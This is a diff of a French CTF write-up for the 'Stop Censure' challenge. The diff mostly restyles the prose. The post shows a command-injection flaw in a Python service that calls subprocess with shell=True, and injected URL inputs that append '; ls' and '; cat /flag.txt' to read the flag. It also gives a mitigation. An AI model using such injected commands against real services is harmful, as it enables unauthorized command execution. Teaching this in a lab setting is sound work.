@@ -8,21 +8,21 @@ comments: true
 
 ---
 
-Salut ! Voici mon write-up sur le challenge **Stop Censure** du Nobrackets CTF. Ce challenge exploite une vulnérabilité d'injection de commande, à travers l'utilisation de `subprocess`. Merci à `Drahoxx` ! 
+Salut à tous ! Voici mon write-up sur le challenge **Stop Censure** du Nobrackets CTF. Ce défi nous propose de jouer avec une vulnérabilité d'injection de commande (qu'on aime tous un peu, avouons-le 😏), via l'utilisation hasardeuse de `subprocess`. Un grand merci à **Drahoxx** pour avoir mis la barre haute (ou presque) !
 
-## Premier coup d'œil
+## Premier coup d'œil 👀
 
-Le challenge nous demande de vérifier si un site est censuré ou non via un service accessible en utilisant `netcat`. Voici comment accéder au service :
+Le challenge nous demande de vérifier si un site est censuré ou non via un service accessible avec `netcat`. Un petit tour dans notre terminal préféré et hop, on se connecte avec :
 
 ```bash
 nc node1.nobrackets.fr 20764
 ```
 
-Une fois connecté, on nous demande de saisir une URL pour vérifier si elle est bloquée. L'objectif est d'exploiter cette interface pour accéder au fichier `/flag.txt`.
+Une fois en ligne, il nous est demandé de saisir une URL pour vérifier si elle est bloquée. Simple en apparence, mais on n’est pas là pour faire du tourisme, hein ? L’objectif est d’exploiter cette interface pour... obtenir le précieux flag dans `/flag.txt`, bien sûr. 💡
 
-## Analyse du code
+## Analyse du code 🔍
 
-Voici le code source du service `chall.py` fourni :
+Voici le code source du service `chall.py` qui nous est fourni. Un rapide coup d'œil, et on repère tout de suite une petite faiblesse... mais chuuut, laissons un peu de suspense 😏 :
 
 ```python
 #!/usr/bin/env python3
@@ -67,18 +67,18 @@ print(res.decode())
 exit(0)
 ```
 
-Le programme utilise `subprocess.run()` pour exécuter la commande `curl` et tester si l'URL existe. Toutefois, le problème réside dans l'utilisation de l'option `shell=True` avec la commande construite à partir de l'entrée utilisateur. Cela permet une injection de commande si la saisie utilisateur n'est pas correctement contrôlée.
+Ici, `subprocess.run()` est utilisé pour exécuter la commande `curl` et tester si l'URL existe. **Mais**, le petit piège ici, c’est l’option `shell=True` combinée à une entrée utilisateur non contrôlée... Vous voyez où ça nous mène ? 🚀 Oui, oui, on peut jouer avec ça !
 
-## Exploitation
+## Exploitation 💥
 
-Pour tester si l'injection de commande fonctionne, j'ai essayé de lister les fichiers avec une commande `ls` :
+Pour vérifier si l'injection de commande fonctionne, j'ai essayé une commande classique de listing de fichiers. C'est parti pour un petit test avec `ls` :
 
 ```bash
 nc node1.nobrackets.fr 20764
 Entrez un site (eg: https://wiki.nobrackets.fr/) >>> https://wiki.nobrackets.fr; ls
 ```
 
-L'output est le suivant :
+Et voilà l'output :
 
 ```bash
 Succès ! Le site est légal et fonctionnel ! Voici ses informations :
@@ -108,17 +108,17 @@ content-length: 42507
 chall.py
 ```
 
-Nous pouvons voir que la commande `ls` a bien été exécutée et que le fichier `chall.py` est listé dans le répertoire.
+Oh, surprise ! 🎉 La commande `ls` a été exécutée, et on peut voir le fichier `chall.py` apparaître. Jackpot !
 
-### Accès au Flag
+### Étape suivante : Accès au Flag 🏴‍☠️
 
-L'étape suivante consiste à injecter une commande pour lire le fichier `/flag.txt`. Voici la commande complète :
+Maintenant que l’injection est confirmée, on passe aux choses sérieuses : récupérer le flag. La commande ? Simple et efficace :
 
 ```bash
 Entrez un site (eg: https://wiki.nobrackets.fr/) >>> https://wiki.nobrackets.fr; cat /flag.txt
 ```
 
-Voici l'output obtenu :
+Et voici ce que ça donne :
 
 ```bash
 Succès ! Le site est légal et fonctionnel ! Voici ses informations :
@@ -134,24 +134,24 @@ cache-control: max-age=600
 x-proxy-cache: MISS
 x-github-request-id: 5066:0DB5:E147C0:E7B1C4:671138C4
 accept-ranges: bytes
-age: 106
-date: Thu, 17 Oct 2024 18:00:36 GMT
+date: Thu, 17 Oct 2024 17:58:50 GMT
 via: 1.1 varnish
-x-served-by: cache-par-lfpg1960025-PAR
+age: 0
+x-served-by: cache-par-lfpg1960039-PAR
 x-cache: HIT
-x-cache-hits: 0
-x-timer: S1729188037.902421,VS0,VE1
+x-cache-hits: 1
+x-timer: S1729187930.281473,VS0,VE129
 vary: Accept-Encoding
-x-fastly-request-id: b7bb977154518a58b081de81a79f9fc6db83fd4d
+x-fastly-request-id: 561b2b3cd07d5177045d938ec4be4fc947ef1304
 content-length: 42507
 
 NBCTF{#FreeTheInternet}
 ```
 
-Le flag est bien récupéré : **NBCTF{#FreeTheInternet}**.
+💥 Bim ! Flag récupéré : **NBCTF{#FreeTheInternet}**. Mission accomplie. 🎯
 
-## Conclusion
+## Conclusion 🏁
 
-Ce challenge montre une autre forme d'injection de commande, cette fois-ci via la bibliothèque `subprocess` avec `shell=True`, qui permet à des utilisateurs malveillants d'exécuter des commandes arbitraires. Pour sécuriser ce type d'application, il est recommandé de désactiver `shell=True` et d'utiliser des commandes bien délimitées, tout en validant rigoureusement les entrées utilisateur.
+Ce challenge montre une nouvelle fois que l'utilisation hasardeuse de `subprocess` avec `shell=True` ouvre la porte à des injections de commande. Les développeurs devraient toujours désactiver cette option et s'assurer que les commandes sont correctement protégées. Et pour nous, hackers, c’est un joli terrain de jeu ! 😉
 
-Merci encore à `Drahoxx` pour ce challenge captivant !
+Encore un grand merci à **Drahoxx** pour ce défi palpitant. On aime toujours quand les failles sont un peu trop faciles à exploiter 😎.
